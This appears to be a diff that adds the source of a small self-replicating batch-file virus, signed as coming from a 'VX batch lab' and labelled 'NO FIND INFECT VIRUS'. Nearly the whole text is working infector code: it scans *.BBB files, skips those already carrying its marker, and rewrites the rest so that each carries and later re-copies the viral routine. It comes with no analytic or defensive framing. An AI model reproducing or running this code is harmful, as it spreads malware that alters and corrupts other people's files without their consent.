@@ -1,0 +1,31 @@
+--------%<------------------------------
+:[ DR RUSTAM NO FIND INFECT VIRUS ]
+MORE +2 "%0">OK
+@FOR %%R IN (*.BBB) DO CALL :INF %%R
+DEL OK&GOTO :EOF
+:INF
+SET /P IM=<%1
+IF "%IM%"=="CALL :TTT" GOTO :EOF
+@FOR /F "TOKENS=1" %%A IN (%1) DO (
+SET STR=%%A
+CALL :NOFL
+)
+ECHO.CALL :TTT>YN
+TYPE %1>>YN
+ECHO.>>YN&ECHO.EXIT>>YN
+ECHO.:TTT>>YN
+SET /A SF=%SN%+4
+ECHO MORE +%SF% "%%0"^>OK>>YN
+TYPE OK>>YN
+MOVE YN %1
+:NOFL
+SET /A SN=%SN%+1
+GOTO :EOF
+--------%<------------------------------
+
+========================================================
+
+
+====-------=-==-===-----==
+| DR RUSTAM/VX BATCH LAB |
+====--=-====-----=-=-====-
